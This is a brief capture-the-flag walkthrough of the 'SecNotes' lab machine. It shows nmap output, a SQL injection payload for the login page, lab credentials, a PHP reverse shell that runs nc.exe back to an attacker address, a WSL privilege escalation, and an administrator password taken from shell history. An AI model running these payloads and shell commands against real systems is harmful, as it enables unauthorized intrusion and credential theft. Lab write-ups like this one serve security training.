# SecNotes
> Silver Garcia

## Enumeration
Nmap
```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-04 14:41 EDT
Nmap scan report for 10.10.10.97
Host is up (0.17s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-title: Secure Notes - Login
|_Requested resource was login.php
| http-methods: 
|_  Potentially risky methods: TRACE
445/tcp  open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
8808/tcp open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows XP (85%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3
Aggressive OS guesses: Microsoft Windows XP SP3 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h20m04s, deviation: 4h02m30s, median: 3s
| smb2-time: 
|   date: 2024-04-04T18:46:22
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: SECNOTES
|   NetBIOS computer name: SECNOTES\x00
|   Workgroup: HTB\x00
|_  System time: 2024-04-04T11:46:21-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

## Getting access
### Exploitation
Got credentials using sql injection on sign up page, then loging in with that account
payload:
```sql
' or 1=1#
```

Credentials>
```
\\secnotes.htb\new-site
tyler / 92g!mA8BGjOirkL%OG*&
```

### Reverse shell
1. Upload nc.exe binary using smb
2. Upload php with following content:
```php
<?php
system('nc.exe 10.10.14.6 4545 -e cmd.exe')
?>
```
3. Set listener and execute file 

## Privilege Escalation
Execute wsl.exe on following directory:
```
C:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17134.1_none_686f10b5380a84cf
```

Escape TTY
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

History command"
```
history
    1  cd /mnt/c/
    2  ls
    3  cd Users/
    4  cd /
    5  cd ~
    6  ls
    7  pwd
    8  mkdir filesystem
    9  mount //127.0.0.1/c$ filesystem/
   10  sudo apt install cifs-utils
   11  mount //127.0.0.1/c$ filesystem/
   12  mount //127.0.0.1/c$ filesystem/ -o user=administrator
   13  cat /proc/filesystems
   14  sudo modprobe cifs
   15  smbclient
   16  apt install smbclient
   17  smbclient
   18  smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
   19  > .bash_history 
   20  less .bash_history
   21  history
```

